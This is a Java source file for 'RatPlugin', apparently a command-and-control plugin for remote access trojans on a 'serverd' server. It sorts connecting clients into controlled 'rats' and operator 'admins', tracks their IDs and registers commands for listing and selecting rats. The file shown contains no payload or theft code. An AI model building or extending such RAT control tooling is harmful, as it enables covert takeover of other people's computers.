package com.ratplugin;

import com.ratplugin.commands.*;
import com.serverd.client.Client;
import com.serverd.plugin.Debug;
import com.serverd.plugin.Plugin;
import com.serverd.plugin.ServerdPlugin;
import com.serverd.plugin.listener.ConnectListener;
import com.serverd.plugin.listener.UpdateIDListener;

import java.util.ArrayList;

public class RatPlugin implements ServerdPlugin, ConnectListener, UpdateIDListener
{
    public ArrayList<Integer> adminsID,ratsID;
    public Pinger pinger;

    public About about;

    NewlineReplacer newlineReplacer;

    @Override
    public void metadata(Plugin.Info info)
    {
        info.name = "RatPlugin";
        info.author = "rafi612";
        info.decription = "Plugin for RAT's";
        info.version = "1.0";
    }

    @Override
    public String init(Plugin plugin)
    {
        adminsID = new ArrayList<>();
        ratsID = new ArrayList<>();

        pinger = new Pinger(plugin,1,20000);
        newlineReplacer = new NewlineReplacer();
        about = new About(plugin);

        plugin.addConnectListener(this);
        plugin.addUpdateIDListener(this);

        plugin.addCommand(new ListRats());
        plugin.addCommand(new Admin());
        plugin.addCommand(new ConnectTime(plugin));
        plugin.addCommand(new Current());
        plugin.addCommand(about);

        return null;
    }

    @Override
    public void work(Plugin plugin)
    {
        pinger.startPinger(plugin,this);
    }

    @Override
    public void stop(Plugin plugin)
    {

    }

    public static void main(String[] args)
    {
        Debug.testPlugin(RatPlugin.class.getName(),true,new String[] {});
    }

    @Override
    public void onConnect(Plugin plugin, Client client)
    {
        //client.setEncoder(newlineReplacer);

        if (client.protocol == Client.Protocol.UDP)
        {
            ClientUtils.makeAdmin(client,this,false);
            ClientUtils.addToAdminList(client,this);
        }
        else
        {
            ClientUtils.makeRat(client);
            ClientUtils.addToRatList(client,this);
        }
    }

    @Override
    public void onDisconnect(Plugin plugin, Client client)
    {
        ClientUtils.removeFromAdminList(client,this);
        ClientUtils.removeFromRatList(client,this);
    }

    @Override
    public void updateID(Plugin plugin, int oldid, int newid)
    {
        updateIDInList(adminsID,oldid,newid);
        updateIDInList(ratsID,oldid,newid);
    }
}